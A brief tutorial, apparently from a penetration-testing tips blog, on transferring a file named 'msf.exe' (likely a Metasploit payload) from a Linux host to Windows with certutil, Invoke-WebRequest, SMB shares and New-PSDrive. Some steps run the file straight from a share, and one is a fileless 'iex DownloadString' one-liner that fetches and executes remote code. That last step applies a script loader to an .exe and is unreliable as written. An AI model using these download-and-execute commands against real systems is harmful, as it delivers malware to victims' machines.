---
title: "Tutorial: Downloading Files from Linux to Windows Using Windows CLI"
date: 2026-01-13
tags: ['http', 'networking', 'security', 'file-transfer', 'cross-platform', 'windows-cli']
description: " "
cover:
  image: "/images/TipsAndTricks/Tips and Tricks.jpg"
  alt: "Tips & Tricks Cover"
  relative: true
---

## Method 1: Using an HTTP Server

### Step 1: Start an HTTP server on Linux
Open a terminal on your Linux machine and run:
```bash
sudo python3 -m http.server 80
```

### Step 2: Download the file using `certutil` on Windows
Open Command Prompt or PowerShell on your Windows machine and run:
```powershell
certutil.exe -urlcache -split -f "http://10.10.14.7/msf.exe"
```

## Method 2: Using `Invoke-WebRequest`

### Step 1: Start an HTTP server on Linux
Same as Step 1 in Method 1.

### Step 2: Download the file using `Invoke-WebRequest` on Windows
Open PowerShell on your Windows machine and run:
```powershell
Invoke-WebRequest -Uri "http://10.10.14.7/msf.exe" -OutFile "msf.exe"
```

## Method 3: Using an SMB Server

### Step 1: Start an SMB server on Linux
Open a terminal on your Linux machine and run:
```bash
sudo smbserver.py gajen $(pwd) -smb2support
```

### Step 2: Download the file from the SMB share on Windows
Open Command Prompt or PowerShell on your Windows machine and run:
```powershell
copy \\10.10.14.42\\gajen\msf.exe msf.exe
```

### Step 3: Execute the file directly from the SMB share on Windows
Open Command Prompt or PowerShell on your Windows machine and run:
```powershell
\\10.10.14.42\\gajen\msf.exe
```

## Method 4: Using `New-PSDrive`

### Step 1: Start an SMB server on Linux
Same as Step 1 in Method 3.

### Step 2: Map the SMB share on Windows
Open PowerShell on your Windows machine and run:
```powershell
New-PSDrive -Name "gajen" -PSProvider "FileSystem" -Root "\\10.10.14.2\gajen"
```

### Step 3: List all PowerShell drives
To list all the currently available PowerShell drives, run:
```powershell
Get-PSDrive
```

### Step 4: Access the mapped drive and copy the file
Open PowerShell on your Windows machine and run:
```powershell
Copy-Item -Path "gajen:\msf.exe" -Destination "C:\path\to\destination\msf.exe"
```
Replace `C:\path\to\destination` with your desired destination path.

## Method 5: Using PowerShell to Execute a Remote Script

### Step 1: Start an HTTP server on Linux
Same as Step 1 in Method 1.

### Step 2: Execute the remote script on Windows
Open Command Prompt on your Windows machine and run:
```powershell
cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.7/msf.exe')
```